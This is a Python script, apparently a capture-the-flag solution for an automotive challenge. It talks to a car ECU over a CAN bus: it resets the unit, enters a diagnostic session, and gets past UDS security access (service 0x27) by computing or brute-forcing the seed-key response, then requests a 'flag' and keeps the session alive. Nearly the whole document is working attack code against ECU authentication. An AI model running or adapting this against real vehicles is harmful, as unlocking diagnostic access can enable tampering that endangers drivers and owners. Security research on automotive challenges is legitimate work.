# This script enabled "Security Access" to the chosen AID. The original version
# brute-forced the key space, but post-dump, I changed it to compute the
# correct response on the first try.

from __future__ import print_function
import sys
import can
import time

import nonce

Bus0 = can.interface.Bus(bustype='socketcan', channel='can0', bitrate=49500)

def getReply(aid, pid):
    t = 0
    dataLen = 0
    data = []
    storedMsg = None
    while (t<50):
        msg = Bus0.recv(0)
        if (msg==None):
            t += 1
            time.sleep(0.1)
            continue
        if (msg.arbitration_id != aid):
            continue
        elif (msg.data[0]&0xf0==0 and msg.data[1] == 0x7f and msg.data[2] == pid):
            return msg
        elif (msg.data[0]&0xf0==0 and msg.data[1] == pid+0x40):
            return msg
        elif (msg.data[0]&0xf0==0x10 and msg.data[2] == pid+0x40):
            storedMsg = msg
            dataLen = msg.data[1]-6
            data = msg.data[1:]
        elif (msg.data[0]&0xf0==0x20):
            pl = min(8, dataLen+1)
            data += msg.data[1:pl]
            dataLen -= (pl-1)
            if (dataLen <= 0):
                msg.data = bytearray(data)
                return msg
    if (storedMsg != None and dataLen != 0):
        storedMsg.data = bytearray(data)
        return storedMsg
    else:
        print("Oops:",dataLen,len(data))
        return None

def createMessages():
    global ResetECU, ModeEnable, RequestSeed, KeepAlive, RequestFlag
    ResetECU = can.Message(arbitration_id=SendAID, data=[0x02, 0x11, 0x02, 0,0,0,0,0], extended_id=False)
    ModeEnable = can.Message(arbitration_id=SendAID, data=[0x02, 0x10, 0x02, 0,0,0,0,0], extended_id=False)
    RequestSeed = can.Message(arbitration_id=SendAID, data=[0x02, 0x27, 0x01, 0,0,0,0,0], extended_id=False)
    KeepAlive = can.Message(arbitration_id=SendAID, data=[0x02, 0x3e, 0x00, 0,0,0,0,0], extended_id=False)
    RequestFlag = can.Message(arbitration_id=0x7D3, data=[0x02, 0xa0, 0x00, 0,0,0,0,0], extended_id=False)
    #RequestFlag = can.Message(arbitration_id=0x7e0, data=[0x02, 0x09, 0x0a, 0,0,0,0,0], extended_id=False)

def deriveKey(seed, modifier):
    i = 0
    short_seed = seed[0]<<8 | seed[1]
    while (True):
        i += 1
        short_key = short_seed^i
        if (0 == nonce.check_key_4b8(short_seed, short_key)):
            return [short_key >> 8, short_key &0xff]

def pinAccess():
    while (True):
        sys.stdout.write('.')
        time.sleep(10)
        Bus0.send(KeepAlive)

def bruteForceKey():
    # Note: hit with f1bc -> f287
    print("Forcing Time!")
    modifier = 0
    while (True):
        modifier += 1

        print(RequestSeed)
        Bus0.send(RequestSeed)
        msg = getReply(RecvAID, 0x27)
        print(msg)

        if (msg.data[0:3] != bytearray([0x04, 0x67, 0x01])):
            print("Unexpected reply!")
            return
        seed = msg.data[3:5]
        key = deriveKey([seed[0],seed[1]], modifier)
        reply = can.Message(arbitration_id=SendAID,
                data=[0x04, 0x27, 0x02]+key+[0,0,0],
                extended_id=False)
        print(reply)

        Bus0.send(reply)
        msg = getReply(RecvAID, 0x27)
        print(msg)

        if (msg.data[0:4] == bytearray([0x03, 0x7f, 0x27, 0x35])):
            print("Denied.")
            continue
        elif (msg.data[0:3] == bytearray([0x02, 0x67, 0x02])):
            print("Access Granted, took",modifier,"attempts.")
            return True
        else:
            print(''.join('{:02x}'.format(x) for x in msg.data))
            break

def simpleRequest(request):
    Bus0.send(request)
    msg = getReply(request.arbitration_id+8, request.data[1])
    print(msg)

    if (msg == None):
        return False
    if (msg.data[1:3] != bytearray([request.data[1]+0x40, request.data[2]])):
        return False
    return msg

def the_hard_way():
    if (not bruteForceKey()):
        print("brute-force failed.")
        exit(3)

    print("Trying for flag")
    simpleRequest(RequestFlag)

    sys.stdout.write('Pinning')
    pinAccess()

if __name__ == "__main__":
    if (len(sys.argv) < 2):
        print("Usage:",sys.argv[0],"<AID>")
        exit(1)
    else:
        SendAID = int(sys.argv[1],0)
        RecvAID = SendAID+8
        createMessages()

    print("using aid:",hex(SendAID))
    print("resetting ecu...")
    Bus0.send(ResetECU)
    time.sleep(0.5)

    print("switching mode...")
    if (not simpleRequest(ModeEnable)):
        print("mode-switch failed.")
        exit(2)

    if (not bruteForceKey()):
        print("brute-force failed.")
        exit(3)

    print("Trying for flag")
    response = simpleRequest(RequestFlag)
    if (response):
        print("got something:",response.data[3:])

    #sys.stdout.write('Pinning')
    #pinAccess()
    

